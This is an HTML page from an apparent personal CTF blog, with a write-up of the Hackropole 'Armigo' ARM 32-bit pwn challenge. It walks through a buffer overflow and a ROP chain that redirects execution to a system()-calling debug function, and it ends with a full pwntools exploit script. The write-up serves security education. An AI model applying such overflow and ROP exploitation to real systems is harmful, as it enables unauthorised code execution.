@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+     <meta charset="utf-8">
+     <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>0xb0tm4n&#x27;s website</title>
+     <script src="https://cdn.jsdelivr.net/npm/js-cookie@3.0.5/dist/js.cookie.min.js" integrity="sha256-WCzAhd2P6gRJF9Hv3oOOd+hFJi/QJbv+Azn4CGB8gfY=" crossorigin="anonymous"></script>
+     <script src="/js/index.js"></script>
+     <script src="/js/prompt.js"></script>
+     <script src="/js/keyboard.js"></script>
+     <script src="/js/tab.js"></script>
+     <script src="/js/commands.js"></script>
+     <script src="/js/config.js"></script><script src="&#x2F;js&#x2F;custom_script.js"></script><link rel="stylesheet" href="/css/base.css"><link rel="stylesheet" href="&#x2F;css&#x2F;intro.css"><link rel="stylesheet" href="/css/page.css"></head>
+<body onkeydown='exec(event)'>
+  <header>
+      <h1>0xb0tm4n&#x27;s website</h1>
+  </header>
+  <main>
+    <div class="files" id="files" tabindex="0">
+<ul><li class="file">
+        <span><a href='https://super-botman.github.io/readme/'
+                 tabindex="-2">  README</a></span>
+    </li><li class="folder"><span>
+            
+            <a href='https://super-botman.github.io/pwn/'
+               tabindex="-3">  Pwn
+            </a>
+        </span>
+
+        <ul>
+        <li class="subfolder"><span>└──
+            
+            <a href='https://super-botman.github.io/pwn/writeups/'
+               tabindex="-4">  Writeups
+            </a>
+        </span>
+
+        <ul>
+        <li class="file">
+                <span>└──
+                    <a class="selected"href='https://super-botman.github.io/pwn/writeups/armigo/'
+                    tabindex="-5">  Hackropole | Armigo</a>
+                </span>
+            </li><li class="file">
+                <span>└──
+                    <a href='https://super-botman.github.io/pwn/writeups/aarchibald/'
+                    tabindex="-6">  Hackropole | Aarchibald</a>
+                </span>
+            </li><li class="file">
+                <span>└──
+                    <a href='https://super-botman.github.io/pwn/writeups/alfred/'
+                    tabindex="-7">  Hackropole | Alfred</a>
+                </span>
+            </li>
+        </ul></li>
+        </ul>
+    </li></ul>
+</div>
+    <div class="viewer page" id="viewer" tabindex="0">
+      <div class="tab">
+<ul id="tabs">
+</ul>
+
+
+</div>
+      <div class="content" id="content"><h1 id="pwn-armigo-hackropole">[Pwn] armigo | hackropole</h1>
+<ul>
+<li><a href="https://super-botman.github.io/pwn/writeups/armigo/#checksec">1. Checksec</a></li>
+<li><a href="https://super-botman.github.io/pwn/writeups/armigo/#writeup">2. Writeup</a></li>
+<li><a href="https://super-botman.github.io/pwn/writeups/armigo/#full-exploit">3. Full exploit</a></li>
+</ul>
+<h2 id="checksec">Checksec</h2>
+<pre data-lang="bash" style="background-color:#212733;color:#ccc9c2;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#ffd580;">[*] </span><span style="color:#bae67e;">&#39;/home/botman/Documents/cybersec/CTF/solo/hackropole/pwn/armigo/armigo&#39;
+</span><span>    </span><span style="color:#ffd580;">Arch:</span><span>     arm-32-little
+</span><span>    </span><span style="color:#ffd580;">RELRO:</span><span>    Partial RELRO
+</span><span>    </span><span style="color:#ffd580;">Stack:</span><span>    No canary found
+</span><span>    </span><span style="color:#ffd580;">NX:</span><span>       NX enabled
+</span><span>    </span><span style="color:#ffd580;">PIE:</span><span>      No PIE (0x10000)
+</span></code></pre>
+<h2 id="writeup">Writeup</h2>
+<p>So this is yet another ARM pwn challenge !
+We begin by open the binary in ghidra and check the main function, firstly we see a bof and then we can see another interesting function called "debug", this one is interesting becauseit's look like it's run some shell commands</p>
+<p><img src="/images/armigo/main.png" alt="main" /></p>
+<p>So now we can look into debug and yes! it's take the first argument and run system with it</p>
+<p><img src="/images/armigo/debug.png" alt="debug" /></p>
+<p>Ok, cool but how can we use this command to get the flag ?
+We can going to build a really easy ROP with a pop r0 with a command like "/bin/bash" or "cat flag" and then ret to debug no ?
+Firstly we're gonna check i there is some string who can help us and yes, we can find the string "cat flag" at the address <em>0x000733fc</em></p>
+<p><img src="/images/armigo/cat_flag.png" alt="cat flag" /></p>
+<p>Ok, so we just have to find a pop instruction and this should be easy because we have a big binary, and yes, it was easy</p>
+<p><img src="/images/armigo/pop.png" alt="pop" /></p>
+<p>So, i'm gonna summarize, we have:</p>
+<ul>
+<li>a pop instruction</li>
+<li>a "cat flag" string</li>
+<li>a debug function who run our shell command</li>
+</ul>
+<p>so we're juste gonna build our rop like this:</p>
+<pre data-lang="exploit" style="background-color:#212733;color:#ccc9c2;" class="language-exploit "><code class="language-exploit" data-lang="exploit"><span>padding + pop + cat_flag + debug
+</span></code></pre>
+<p>this will pop r0 and lr (which is the "parente return address") and then put "cat flag" in r0 and debug addr in lr, after this there is a "bx lr" instruction which will jmp to our addr.</p>
+<p>and here we go, we got the flag</p>
+<p><img src="/images/armigo/flag.png" alt="flag" /></p>
+<h2 id="full-exploit">Full exploit</h2>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#ffa759;">from </span><span>pwn </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">exploit</span><span>(</span><span style="color:#ffcc66;">io</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">elf</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">libc</span><span style="color:#f29e74;">=</span><span style="color:#ffcc66;">None</span><span>):
+</span><span>    padding </span><span style="color:#f29e74;">= </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;A&quot;</span><span style="color:#f29e74;">*</span><span style="color:#ffcc66;">68 
+</span><span>    pop </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x000703c8 </span><span style="font-style:italic;color:#5c6773;"># pop {r0, lr}; bx lr;
+</span><span>    cat_flag </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x000733fc </span><span style="font-style:italic;color:#5c6773;"># &quot;cat flag&quot;
+</span><span>    debug </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x000104d8
+</span><span>
+</span><span>    payload </span><span style="color:#f29e74;">= </span><span>padding </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p32</span><span>(pop) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p32</span><span>(cat_flag) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p32</span><span>(debug)
+</span><span>
+</span><span>    io</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendlineafter</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&#39;?</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&#39;</span><span style="color:#ccc9c2cc;">, </span><span>payload)
+</span><span>    io</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvline</span><span>()
+</span><span>    flag </span><span style="color:#f29e74;">= </span><span>io</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvline</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">decode</span><span>(</span><span style="color:#bae67e;">&#39;utf-8&#39;</span><span>)
+</span><span>    io</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">success</span><span>(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&#39;flag: </span><span>{flag}</span><span style="color:#bae67e;">&#39;</span><span>)
+</span><span>
+</span></code></pre>
+<p><a href="/exploits/armigo.py">download here</a></p>
+<p><strong>Writed by 0xB0tm4n</strong></p>
+
+      </div>
+    </div>
+    <div class="prompt" id="terminal"><input
+    type="text"
+    id="setter"
+    onkeydown="writeit(this, event);moveIt(this.value.length, event)"
+    onchange="writeit(this, event)"
+    onkeyup="writeit(this, event)"
+    onkeypress="writeit(this, event);"
+    >
+<label for="setter" id="writer"> </label><b class="cursor" id="cursor"></b></div>
+  </main>
+</body>
+</html>
